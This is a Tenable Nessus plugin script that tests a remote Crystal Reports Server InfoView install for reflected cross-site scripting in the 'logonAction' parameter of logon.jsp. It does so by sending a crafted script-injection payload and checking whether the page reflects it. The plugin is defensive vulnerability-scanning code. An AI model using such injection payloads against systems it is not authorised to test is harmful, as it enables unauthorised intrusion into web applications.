#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(51816);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2017/05/11 13:46:37 $");

  script_bugtraq_id(45980);

  script_name(english:"Crystal Reports Server InfoView logonAction Parameter XSS");
  script_summary(english:"Tries to inject script code via InfoViewApp/logon.jsp");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a JSP script that is prone to a cross-
site scripting attack.");
  script_set_attribute(attribute:"description", value:
"The InfoView component included with the Crystal Reports Server
install on the remote host contains a JSP script fails to sanitize
user input to the 'logonAction' parameter of its 'logon.jsp' script
before using it to generate dynamic HTML output.

An attacker may be able to leverage this issue to inject arbitrary
HTML or script code into a user's browser to be executed within the
security context of the affected site.

Note that this install is likely affected by other cross-site
scripting issues as well as a directory traversal vulnerability,
although Nessus has not checked for them.");
  script_set_attribute(attribute:"see_also", value:"http://dsecrg.com/pages/vul/show.php?id=301");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2011/Jan/156");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?cde1ca7a");
  script_set_attribute(attribute:"solution", value:
"See https://websmp130.sap-ag.de/sap/support/notes/1458310 (requires
credentials).");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/01/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/10/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/01/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:businessobjects:crystal_reports_server");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2011-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:8080);


# Look for the InfoView component.
dir = '/InfoViewApp';
cgi = '/logon.jsp';
res = http_send_recv3(method:"GET", item:dir+cgi, port:port, exit_on_fail:TRUE);

if (
  !res[2] ||
  (
    "InfoView" >!< res[2] &&
    "BusinessObjects" >!< res[2]
  )
) exit(0, "The InfoView component was not found on the web server on port "+port+".");


# Try to exploit the issue.
alert = "<script>alert('" + SCRIPT_NAME + "')</script>";
exploit = unixtime() + "';</script>" + alert;

vuln = test_cgi_xss(
  port     : port,
  cgi      : cgi,
  dirs     : make_list(dir),
  qs       : "logonAction=" + urlencode(str:exploit),
  pass_str : "longServiceUrl = '" + exploit + "';",
  pass2_re : '<title>InfoView</title>|Log On to InfoView'
);

if (!vuln)
  exit(0, "The InfoView component at "+build_url(port:port, qs:dir+'/')+" is not affected.");
